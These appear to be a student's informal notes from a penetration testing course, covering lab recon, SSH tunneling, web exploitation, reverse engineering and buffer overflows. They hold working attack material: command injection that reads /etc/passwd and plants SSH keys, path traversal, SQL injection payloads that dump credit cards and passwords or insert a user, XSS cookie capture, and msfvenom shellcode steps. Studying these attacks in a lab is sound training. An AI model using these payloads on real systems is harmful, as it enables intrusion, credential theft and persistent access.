Security
xfreerdp /u:student /v:10.50.33.144 -dynamic-resolution +glyph-cache +clipboard

Darknet diaries

Operation        | from MARFOR CYBER about attacking ISIS media
Glowing Symphony |

GALE-507-M 

iv4CRgEPySw8bJM 

JUMP
10.50.44.245

10.50.20.250:8000/

Jo 10.50.47.112
Wat 10.50.37.149


Lin-ops
192.168.65.20, 10.50.23.212

Win-ops
192.168.65.10, 10.50.33.144


Penetration Testing
_______________________________________________________________________________________________________________________

We will always make a tunnel to our jump box first. It is in the grey space. The username and password is student and password is (bad)password. 

Penetration testing is ethical hacking in order to find weaknesses in security.
The rationale promotes critical thinking, so when you are attacking a network you have to think outside of the box in order to get in.

Phase 1
Mission definition is when they set boundaries and rules

Phase 2
Recon, doing either passive or active recon. Using tools like nmap (more active so not necessarily), google dorking, nslookup, social media, etc.

Phase 3
Footprinting, more in depth recon using nmap and nmap script, the more active side, 

Phase 4
Exploitation and Initial Access, gain an initial foothold on network

Phase 5
Post-Exploitation, establish persistence, escalate privileges, cover your tracks, exfilltrate target data

Phase 6
Document Mission, documentation for different audiences

Penetration Test Reporting, an executive summary (breaks down everything as quickly as possible) and technical summary (has a lot more jargon)
When reporting have reasons to report, what to report, screen captures. 

Darknet diaries


Recon
_______________________________________________________________________________________________________________________

nmap scan scripts
OSINT, using google, google dorking, social media, linkden, alternate ports, versions of services running, OS.
DOD states "produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."

Limitations on Collection
Data to Collect, Web Data, Sensitive Data, Publicly Accessible, Social Media, Domain and IP Data

Scraping Data
quotes.toscrape.com
pip install lxml requests
Look at the script on the slides for the scraping data
You will change page and authors that's about it

#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)


Advanced Scanning Techniques
1. Host Discovery
  - Find hosts that are onine
2. Port Enumeration 
  - Find ports for each host that is online
3. Port Interrogation
  - Find what service is running on each open/available port

1. Dirty ping sweep, for i in {1..254}; do (ping -c 1 10.50.$i.$i | grep "bytes from" &); done
2. sudo nmap -sS -Pn 10.50.46.154
2.1. nc -z -v -w 1 10.50.46.154 1-1000 2>/dev/null (maybe?)
3. nc 10.50.46.154 3389
3.1 nikto -h 10.50.46.154 -p 80 (only for web servers)


NMAP Scripting Engine
in /usr/share/nmap/scripts
nmap --script=http-enum.nse 10.50.45.112
nmap --script=banner.nse 10.50.45.112


ALSO ON THE HOST EXPLOITATION FG
Master Sockets
IH> ssh -MS /tmp/gray student@10.50.46.154
JUMP> 

IH> ls /tmp/gray
IH> ssh -MS /tmp/gray -O cancel student@10.50.46 (tears down the tunnel)
IH> ssh -S /tmp/gray dummy -O forward -L2222:10.50.46.238:22
IH> ssh 127.0.0.1 -p 2222
jump2> 

IH> ssh -S /tmp/gray dummy -O forward -D 9050

IH> ssh -MS /tmp/tgt jim@127.0.0.1 -p 2222
IH> ssh -S /tmp/tgt/ Dummy -O forward -D 9050






lin-ops> ssh -MS /tmp/gray student@10.50.44.245
jump> 
lin-ops> ssh -S /tmp/gray dummy -O forward -L 1630:192.168.28.120:4242
lin-ops> ssh -MS /tmp/tgt student@127.0.0.1 -p 1630
lin-ops> ssh -S /tmp/tgt dummy -O forward -D 9050









Vulnerability and Exploitation Research
_______________________________________________________________________________________________________________________

Just google good fuckin nerd





Web Exploitation Day 1
_______________________________________________________________________________________________________________________

THIS SHIT IS IMPORTENANT
GET / HTTP/1.1
We will be using Developer Console but not wireshark or tcpdump


HTTP
A select Few: GET, POST, head, put
HTTP Response Codes
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

inspect and look at network
If 80 is open then immediately make a tunnel and open the web page
.JS is javascript, java is a different language


Enumeration
ROBOTS.TXT 
nmap -T4 -p 80 --script http-enum.nse ipaddr
^ may or may not catch but ROBOTS is crucial 
NEED FOR THE TEST 
Burp suite for outside of class

Reflected XSS 
Needs a pretty secure server that isn't gong to execute this code, and a vulnerable browser
Most common form
Transient, occurs in error messages
Delivered through intermediate media uch as an email link
Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS
Resides on vulnerable site, only requires user to visit page
Capturing cookie
document.cookie
Capturing Keystrokes
bind KEYDOWN and KEYUP
Cap sensitive data
ip document.body.innerHTML

Server side injection view_image.php?file=../../etc/passwd
../../../../../etc/passwd
/var/www/html-userdata
Malicious File upload with the sipcy 
system("ping -c 1 ".$_GET["ip"]);
; cat /etc/passwd


System to ping (X.X.X.X ): 
; mkdir /var/www/ssh
ssh-keygen -t rsa -b 4096
cd .ssh
id_rsa is private key .pub is public
cat public key
grab everything and move it to a vim
; echo "ssh-rsa
student@lin-ops" > /var/www/.ssh/authorized keys
paste in the http, try to cat /var/www/.ssh/authorized_keys to read it
ssh -i id_rsa www-data@10.50.45.112
no password needed cause gaemr




so get on the gah damn website browser thing, insert on billybobs home directory a new .ssh part, add authorized_keys with the key generated
ssh through tunnel

http://127.0.0.1:1850/books_pick.php?book=../../../../../etc/passwd
 ssh -S /tmp/gray dummy -O cancel -D 9050
student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -D 9050
student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -L 1850:10.100.28.55:80









Web Exploitation Day 2
_______________________________________________________________________________________________________________________

SQL Injection
*SELECT, *UNION, USE, UPDATE, DELETE, INSERT INFO, CREATE DATABASE, ALTER DATABASE, CREATE TABLE, ALTER TABLE, DROP TABLE, CREATE INDEX, DROP INDEX
SHOW is another important command, every command needs to be ended with a ;
Databases hold tables, tables hold columns

SELECT column,column,column FROM Database.Table;
Union is a lot like Pipe |


> SHOW databases;
> SHOW TABLES FROM session;
> SHOW COLUMNS FROM session.Tires;
> SELECT Tireid,name,size,cost FROM session.tires;
> SELECT Tireid,name,cost,size FROM session.tires;
> SHOW COLUMNS FROM session.car;
> SELECT color,year,name FROM session.car;
> SELECT color,year,name FROM session.car UNION SELECT name,size,cost FROM session.Tires;
> SELECT color,year,name,1 FROM session.car UNION SELECT name,size,cost,tireid FROM session.Tires;
    The 1 in this is a placeholder for the uneven amount of columns
> SELECT color,year,name,cost FROM session.car UNION SELECT name,size,cost,tireid FROM session.Tires;



for username and password 'tom' or 1='1'
Run it, open f12 or the inspect, then go to network to the POST request. Click on raw, add a ? after php, and then copy the raw part


10.50.35.75/Union.html
> Audi' or 1='1
> Audi' UNION select 1,2,3,4,
> Audi' UNION select 1,2,3,4,5;#
> Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns;#
> Audi' UNION select id,2,name,pass,5 from session.user;#
http://10.50.35.75/uniondemo.php?Selection=1&Submit=Submit
http://10.50.35.75/uniondemo.php?Selection=2 or 1=1 # 
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2 #
http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns #
http://10.50.35.75/uniondemo.php?Selection=2 UNION select cost,color,year from session.car UNION select carid,name,type from session.car #
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,@@version #
^ How you get the version of SQL 



ssh -S /tmp/gray dummy -O forward -L 1870:10.100.28.48:80
http://127.0.0.1:1870/cases/productsCategory.php?category=13
http://127.0.0.1:1870/cases/productsCategory.php?category=1%20UNION%20select%20creditcard_number,2,3%20from%20sqlinjection.payments#
http://127.0.0.1:1870/cases/productsCategory.php?category=1%20UNION%20select%20username,password,permission%20from%20sqlinjection.members#





INSERT INTO members (firstname, lastname, username, password, email, permission)

firstname: Hacker
lastname: 
*username: McGee', '1234', '1234', 1);#
*password: 1
*email: 1








Reverse Engineering
_______________________________________________________________________________________________________________________


MOV move source to destination, LEA is also MOV
PUSH Pushes a round on top
POP Pops one off the top
CMP compares by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same
JMP jump to specific location
JLE Jump if less than
JE Jump if equal
JNZ Jump if not zero


Win-ops station will be the primary thing we will be using 





Demo 1
Opens up a cmd prompt with Enter Key: showing up to the user, after typing in random stuff it says Failed!!. and then closes. If typing in 123 it will say Success!!.
Open up Ghidra and dissassemble

Demo 2
After running it opens up a cmd prompt "Enter Key:" is displayed and will disappear after running a random key. It will say "123 is not the string" if you typed in 123. Key might be the key, after typing it in it says Success. and disappears. 



entry.exe
After running it it opens a cmd prompt that is asking for a key, if entered wrong it says Invalid Key. If entered 123@magicKey it will return Success.



basic1.exe
After running it, it opens a cmd prompt that is asking for a key, if entered wrong it says Invalid Key. 
Open up Ghidra and dissassemble
Search strings for enter
92, 138, 184, 230, 276, 322, 368, 414, 460, 506
echo 2990 | md5sum


sdst.exe
When ran it opens a cmd prompt and asks for an enter key, if key is Invalid it will tell you. Also creates two files secret1.txt (0b and blank) and secret2.txt (1KB and has 8011 in it)
Open Ghidra and dissassemble 
fuckface has secret2.txt opened with it which has a value of 8011 in it, meaning that secret.txt that is opened with shitter is the empty file. 



sdst2.exe
Opens window that says Press the Enter Key and creates secret3.txt and some registery key called KEYED3 on the code. If the chucklefuck's strlen is not equal to zero then it and the other vairable king will be compared to char. If both of these files are filled with the words fuck as I did, it will print back success.




sdst3.exe
Says windows version doesn't want to run
Open Ghidra and dissassemble












Exploitation Development PART 2
_______________________________________________________________________________________________________________________
Buffer overflows
We will be conducting a buffer overflow, just follow the steps and don't skip over. Monkey brain it. THIS WILL TAKE A LONG TIME, so maybe skip over and get other ones done on the test first.

Heap
Memory that can be allocated and deallocated

Stack
A contiguous section of memory used for passing arguments

Registers
Storage elements as close as possible to the central processing unit (CPU)

Instruction Pointer (IP)
a.k.a Program Counter (PC), contains the address of next instruction to be executed

Stack Pointer (SP)
Contains the address of the NEXT AVAILABLE space on the stack

Base Pointer (BP)
The base of the stack

Function
Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

Shellcode
The code that is executed once an exploit successfully takes advantage of a vulnerability
Code that is written in byte format that gets you ideally a shell depending on the level of the exploit


Buffer Overflow Defenses
    Non executable (NX) stack *most new machines have this*
    Address Space Layout Randomization (ASLR) *turn this OFF so we can predict it* IMPORTANT
    Data Execution Prevention (DEP) *very similar to NX but made for windows?*
    Stack Canaries *bonus question involving the ctf, if a canary dies the program will cease execution. Older method but popular.* IMPORTANT
    Position Independent Executable (PIE) *=

Technical Help

Utilizing tools such as:
    IDA, GHIDRA
    GDB, MONA, IMMUNITY *IMPORTANT*
    BASH, PYTHON *IMPORTANT*







Taking user input. With either this or parameters.
When inputing start with random strings, then try to overload it. After spamming a I got a segmentation fault.
If on an adversaries machine use absolute
Every C program has main in there at first
gdb *file*
pdisass main
ignore get_pc_thunk
pdisass getuserinput
gets@plt name is gets
gets() is vulnerable because it does not take null something, making it so it can be buffer overflowed
ALWAYS LOOK INTO USER MADE FUNCTIONS
Develope an exploit using python
./func <<< $(python web_exdemo.py)
^ For when it takes user input
./func $(python web_exdemo.py)
if it takes parameters just fill it in
use wiremask.eu to make a pattern and replace the overflow variable in the web_exdemo.py
then go into gdb func 
run <<< $(python web_exdemo.py)
then paste the EIP to Register value
Take the Offset and change the A spam to it, then use the eip and send four bytes of whatever you want (B)
now raw dog gdb
env - gdb func
show env
unset env LINES
unset en COLUMNS
show env (make sure it is empty)
run
spam a for a while
info proc map
find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
 - first value is the line right under the heap, the second is the one right above the stack, the other two stay the same
 - take any 5 of the things you see
 - reverse the byte order of the hex values you got
 - separate them by 2 characters each and reverse the bitch
msfvenom *to create our shell code*
msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python 
---------------------- LINUX/x86/EXEC CAN ALWAYS BE USED -------------------------------
add a nop = "\x90" * 15 to your code


inventory
What you need is the memory from the .111 machine and you need to set up the msfvenom to cat the account. I set up the program on the lin-ops and scp it over with scp -P 1620 inven.py comrade@127.0.0.1:.














wiremask.eu
